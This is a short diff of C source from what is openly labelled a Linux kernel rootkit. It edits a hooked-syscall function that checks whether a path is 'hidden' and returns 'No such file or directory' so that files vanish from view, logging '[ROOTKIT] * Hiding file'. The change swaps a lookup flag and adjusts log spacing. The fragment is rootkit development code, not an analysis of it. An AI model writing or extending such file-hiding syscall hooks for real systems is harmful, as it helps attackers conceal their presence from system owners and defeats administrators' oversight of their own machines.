@@ -55,12 +55,12 @@ long do_check_hidden(const sysfun_t orig_func, struct pt_regs *const p_regs, con
         ui32_lookup_flags |= LOOKUP_EMPTY;
     }
 
-    IF_U (i32_at_flags & AT_LOOKUP_PARENTS) {
-        ui32_lookup_flags |= LOOKUP_PARENTS;
+    IF_U (i32_at_flags & AT_LOOKUP_CREATE) {
+        ui32_lookup_flags |= LOOKUP_CREATE;
     }
 
     IF_U (is_pathname_hidden(i32_dfd, s_filename, ui32_lookup_flags)) {
-        pr_info("[ROOTKIT]   * Hiding file\n");
+        pr_info("[ROOTKIT]     * Hiding file\n");
 
         return -ENOENT; // No such file or directory
     }
